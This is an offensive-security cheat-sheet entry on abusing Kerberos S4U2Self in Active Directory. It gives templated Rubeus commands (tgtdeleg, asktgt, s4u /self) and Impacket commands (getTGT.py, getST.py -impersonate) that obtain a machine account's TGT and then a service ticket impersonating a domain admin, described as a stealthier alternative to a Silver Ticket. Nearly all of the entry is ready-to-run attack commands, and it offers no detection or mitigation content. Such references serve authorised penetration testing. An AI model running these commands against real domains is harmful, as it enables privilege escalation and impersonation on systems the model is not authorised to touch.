---
technique: S4U2SelfAbuse
category: kerberos-delegation
targets: Domain Computer, Local Machine
protocols: Kerberos
remote_capable: false
tags: kerberos s4u2self lpe lateral-movement machine-account ad
---

# S4U2Self Abuse

S4U2self allows any machine account (which always has SPNs by default) to obtain a service ticket to itself on behalf of any domain user, regardless of whether that user is sensitive for delegation or in the Protected Users group. Code execution as `NT AUTHORITY\NETWORK SERVICE` or any Microsoft Virtual Account (e.g. `defaultapppool`, `mssqlservice`) is enough to trigger this, because those accounts authenticate on the network as the machine itself. The resulting service ticket is legitimate and carries a valid PAC, making this a stealthier alternative to a Silver Ticket when the machine account's Kerberos keys are known.

## Windows

Rubeus tgtdeleg is the primary entry point; the S4U2self request can then be made locally or remotely after passing the ticket.

### Rubeus tgtdeleg

#powershell #rubeus #tgt

Obtain the machine account's TGT by abusing the tgtdeleg feature from code running as a Virtual Account on the target host.

```powershell title:"Extract machine account TGT via Rubeus tgtdeleg"
.\Rubeus.exe tgtdeleg /nowrap
```
<!-- cheat -->

### Rubeus asktgt (from known credentials)

#powershell #rubeus #tgt

Request a TGT for the machine account when its NT hash or AES key is already known, as an alternative to tgtdeleg.

```powershell title:"Request machine account TGT via Rubeus asktgt"
.\Rubeus.exe asktgt /nowrap /domain:"$domain" /user:"$machine_account$" /rc4:"$nt_hash"
```
<!-- cheat
var domain
var machine_account
var nt_hash
-->

### Rubeus s4u self

#powershell #rubeus #s4u

Use the machine account's TGT to request a service ticket to itself impersonating a domain admin, then inject it for use.

```powershell title:"S4U2self service ticket via Rubeus"
.\Rubeus.exe s4u /self /nowrap /impersonateuser:"$impersonate_user" /altservice:"cifs/$machine_fqdn" /ticket:"$base64_tgt"
```
<!-- cheat
var impersonate_user
var machine_fqdn
var base64_tgt
-->

## Linux

Impacket getTGT and getST cover the same two steps from Linux; the final ticket is loaded via KRB5CCNAME.

### getTGT (machine account)

#python #impacket #tgt

Obtain the machine account's TGT using its NT hash, as preparation for the S4U2self request.

```sh title:"Get machine account TGT via Impacket getTGT"
getTGT.py -dc-ip "$rhost_ip" -hashes "aad3b435b51404eeaad3b435b51404ee":"$nt_hash" "$domain"/"$machine_account$"
```
<!-- cheat
import domain_ip
var dc_ip
var nt_hash
var domain
var machine_account
-->

### export KRB5CCNAME (getTGT)

#shell #env

Set KRB5CCNAME to the machine account ccache written by getTGT.py so subsequent tools use it.

```sh title:"Load getTGT.py ccache into KRB5CCNAME"
export KRB5CCNAME="$machine_account.ccache"
```
<!-- cheat
var machine_account
-->

### getST (S4U2self)

#python #impacket #s4u

Use the machine account TGT (or credentials directly) to perform S4U2self and obtain a service ticket impersonating a domain admin.

```sh title:"S4U2self service ticket via Impacket getST"
getST.py -self -impersonate "$impersonate_user" -altservice "cifs/$machine_fqdn" -k -no-pass -dc-ip "$rhost_ip" "$domain"/"$machine_account$"
```
<!-- cheat
import domain_ip
var dc_ip
var impersonate_user
var machine_fqdn
var domain
var machine_account
-->

### export KRB5CCNAME (getST S4U2self)

#shell #env

Set KRB5CCNAME to the impersonated user's ccache written by getST.py.

```sh title:"Load S4U2self ccache into KRB5CCNAME"
export KRB5CCNAME="$impersonate_user.ccache"
```
<!-- cheat
var impersonate_user
-->
